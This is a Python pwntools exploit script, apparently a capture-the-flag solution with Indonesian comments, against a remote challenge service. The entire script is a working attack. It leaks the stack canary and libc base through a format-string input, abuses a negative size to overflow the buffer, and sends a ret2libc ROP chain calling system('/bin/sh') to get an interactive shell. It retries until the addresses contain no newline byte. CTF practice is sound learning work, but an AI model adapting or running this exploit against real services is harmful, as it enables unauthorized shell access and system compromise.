from pwn import *
import time

elf = ELF('./chal')
libc = ELF('./libc.so.6')
context.binary = elf

offset_libc = 0x2a578  # Offset presisi GLIBC 2.39 indeks 29

while True:
    try:
        p = remote('chal.sieberr.live', 21003)
        
        # 1. Leak Canary & Libc Remote
        p.sendlineafter(b"What is your name?", b"%27$p %29$p")
        p.recvuntil(b"Welcome, ")
        leak_data = p.recvline().strip().split()
        
        canary = int(leak_data[0], 16)
        leak_libc = int(leak_data[1], 16)
        libc.address = leak_libc - offset_libc
        
        # 2. Ambil Gadget ROP
        rop = ROP(libc)
        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
        ret = rop.find_gadget(['ret'])[0]
        bin_sh = next(libc.search(b"/bin/sh\x00"))
        system_addr = libc.symbols['system']
        
        # Saringan Badchar \x0a (Newline pembunuh fgets)
        check_bytes = p64(canary) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)
        if b'\x0a' in check_bytes:
            p.close()
            continue
            
        log.success(f"Libc Base Remote Sukses: {hex(libc.address)}")
        log.success(f"Canary Remote Sukses: {hex(canary)}")
        
        # 3. Susun Payload Utama (Padding: 88 byte)
        payload = b"A" * 88
        payload += p64(canary)
        payload += b"B" * 8          # Saved RBP
        payload += p64(ret)          # Stack Alignment (MOVAPS Fix)
        payload += p64(pop_rdi)
        payload += p64(bin_sh)
        payload += p64(system_addr)
        
        # 4. Kirim Serangan secara hati-hati
        p.sendlineafter(b"How much space do you want?", b"-1")
        
        # Kirim payload dan berikan jeda micro-second agar server memproses stack frame
        p.sendline(payload)
        time.sleep(0.5)
        
        # Bersihkan sisa output buffer sebelum masuk mode interaktif
        p.clean(timeout=0.5)
        
        log.info("Membuka interaksi Shell... Ketik 'cat flag.txt'")
        p.interactive()
        break
        
    except Exception:
        try: p.close()
        except: pass
